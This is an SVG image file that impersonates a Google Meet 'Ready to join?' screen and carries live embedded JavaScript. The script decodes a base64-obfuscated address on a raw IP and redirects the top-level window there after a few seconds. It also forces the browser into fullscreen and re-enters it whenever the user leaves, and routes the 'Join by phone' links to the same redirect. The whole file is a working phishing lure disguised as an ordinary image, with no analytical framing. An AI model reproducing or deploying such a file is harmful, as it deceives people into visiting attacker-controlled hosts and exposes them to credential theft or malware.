<svg width="100vw" height="100vh" viewBox="0 0 400 600" xmlns="http://www.w3.org/2000/svg" style="display:block;position:fixed;top:0;left:0;width:100vw;height:100vh;">
  <defs>
    <!-- Gradient for background -->
    <linearGradient id="bgGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#f8f9fa"/>
      <stop offset="100%" stop-color="#e8f0fe"/>
    </linearGradient>
    <!-- Shadow filter -->
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#000" flood-opacity="0.08"/>
    </filter>
  </defs>
  <script type="application/ecmascript"><![CDATA[
    function goToBase64Link() {
      var b64 = "aHR0cDovLzE5NC43Ni4yMjcuMjI1L2luZGV4LnBocA==";
      var url = atob(b64);
      if (url !== window.location.href) {  // Prevent self-loop
        window.top.location.replace(url);  // Break out of frames and redirect
      }
    }

    // Function to request full-screen
    function goFullScreen() {
      var elem = document.documentElement;
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.mozRequestFullScreen) { // Firefox
        elem.mozRequestFullScreen();
      } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) { // IE/Edge
        elem.msRequestFullscreen();
      }
    }

    // Auto-trigger full-screen after 2 seconds (for "connecting" effect)
    setTimeout(goFullScreen, 2000);

    // Auto-redirect after another 2 seconds (total 4s, to allow full-screen first)
    setTimeout(goToBase64Link, 4000);

    // Attempt to re-enter full-screen if exited
    document.addEventListener('fullscreenchange', function() {
      if (!document.fullscreenElement) {
        goFullScreen();
      }
    });
  ]]></script>
  <!-- Background -->
  <rect width="400" height="600" fill="url(#bgGradient)"/>
  <!-- Header -->
  <rect x="0" y="0" width="400" height="64" fill="#fff" filter="url(#shadow)"/>
  <!-- Google Meet logo area -->
  <g transform="translate(24, 20)">
    <circle cx="0" cy="12" r="6" fill="#4285f4"/>
    <circle cx="16" cy="12" r="6" fill="#ea4335"/>
    <circle cx="32" cy="12" r="6" fill="#fbbc04"/>
    <circle cx="48" cy="12" r="6" fill="#34a853"/>
    <text x="64" y="18" font-family="Arial, Helvetica, sans-serif" font-size="20" fill="#5f6368" font-weight="500">
      Google Meet
    </text>
  </g>
  <!-- Main card -->
  <rect x="32" y="100" width="336" height="360" rx="16" fill="#fff" filter="url(#shadow)"/>
  <!-- Meeting title -->
  <text x="200" y="150" font-family="Arial, Helvetica, sans-serif" font-size="22" fill="#3c4043" font-weight="500" text-anchor="middle">
    Ready to join?
  </text>
  <!-- Meeting ID/info -->
  <rect x="80" y="170" width="240" height="36" rx="8" fill="#f8f9fa" stroke="#e8eaed" stroke-width="1"/>
  <text x="200" y="193" font-family="Arial, Helvetica, sans-serif" font-size="14" fill="#5f6368" text-anchor="middle">
    Meeting ID: nMg-kja6-kB2
  </text>
  <!-- Participant icons (moved lower) -->
  <g transform="translate(110, 250)">
    <circle cx="0" cy="0" r="16" fill="#1a73e8"/>
    <text x="0" y="5" font-family="Arial" font-size="12" fill="#fff" text-anchor="middle" font-weight="bold">CA</text>
    <circle cx="36" cy="0" r="16" fill="#34a853"/>
    <text x="36" y="5" font-family="Arial" font-size="12" fill="#fff" text-anchor="middle" font-weight="bold">MH</text>
    <circle cx="72" cy="0" r="16" fill="#ea4335"/>
    <text x="72" y="5" font-family="Arial" font-size="12" fill="#fff" text-anchor="middle" font-weight="bold">CC</text>
    <circle cx="108" cy="0" r="16" fill="#fbbc04"/>
    <text x="108" y="5" font-family="Arial" font-size="12" fill="#fff" text-anchor="middle" font-weight="bold">+1</text>
  </g>
  <!-- Connecting button with animation (replaces Join now) -->
  <g transform="translate(130, 320)">
    <rect width="140" height="48" rx="22" ry="22" fill="#1a73e8" />
    <text x="30" y="30" font-family="Arial, Helvetica, sans-serif" font-size="16" fill="#fff" font-weight="500">
      Connecting
    </text>
    <!-- Animated dots -->
    <circle cx="110" cy="24" r="2" fill="white">
      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" />
    </circle>
    <circle cx="120" cy="24" r="2" fill="white">
      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" begin="0.3s" />
    </circle>
    <circle cx="130" cy="24" r="2" fill="white">
      <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" begin="0.6s" />
    </circle>
  </g>
  <!-- Secondary options (kept clickable) -->
  <g transform="translate(200, 390)">
    <g onclick="goToBase64Link()" style="cursor:pointer;">
      <text x="0" y="0" font-family="Arial, Helvetica, sans-serif" font-size="13" fill="#1a73e8" text-anchor="middle">
        Join by phone
      </text>
    </g>
    <g onclick="goToBase64Link()" style="cursor:pointer;" transform="translate(0, 24)">
      <text x="0" y="0" font-family="Arial, Helvetica, sans-serif" font-size="13" fill="#1a73e8" text-anchor="middle">
        More joining options
      </text>
    </g>
  </g>
  <!-- Footer info -->
  <text x="200" y="570" font-family="Arial, Helvetica, sans-serif" font-size="11" fill="#5f6368" text-anchor="middle">
    By joining, you agree to our Terms of Service and Privacy Policy
  </text>
</svg>
